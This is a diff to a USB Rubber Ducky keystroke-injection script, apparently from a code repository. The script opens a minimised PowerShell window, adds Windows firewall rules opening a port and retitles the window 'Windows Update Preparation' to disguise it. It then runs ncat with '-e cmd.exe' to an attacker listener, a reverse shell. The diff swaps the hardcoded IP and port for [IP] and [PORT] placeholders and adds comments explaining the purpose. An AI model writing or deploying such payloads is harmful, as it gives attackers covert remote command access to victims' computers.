@@ -1,9 +1,11 @@
+REM A simple Ducky script that uses a small powershell window to open a port, then downloads and starts Netcat through that port.
+REM Replace [PORT] with the desired port, and [IP] with the listener IP.
 GUI R
 DELAY 500
 STRING PowerShell.exe -noe -c ". mode.com con: lines=1 cols=12"
 ENTER
 DELAY 500
-STRING netsh advfirewall firewall add rule name=z63524 dir=in action=allow protocol=TCP localport=63524; netsh advfirewall firewall add rule name=z63524 dir=out action=allow protocol=TCP localport=63524
+STRING netsh advfirewall firewall add rule name=Firewall dir=in action=allow protocol=TCP localport=[PORT]; netsh advfirewall firewall add rule name=Firewall dir=out action=allow protocol=TCP localport=[PORT]
 ENTER
 DELAY 300
 STRING $Host.UI.RawUI.WindowTitle = "Windows Update Preparation"
@@ -29,7 +31,7 @@ DELAY 750
 STRING cd nmap-7.80
 ENTER
 DELAY 500
-STRING .\ncat.exe 192.168.7.205 63524 -e cmd.exe
+STRING .\ncat.exe [IP] [PORT] -e cmd.exe
 DELAY 50
 ENTER
 DELAY 100
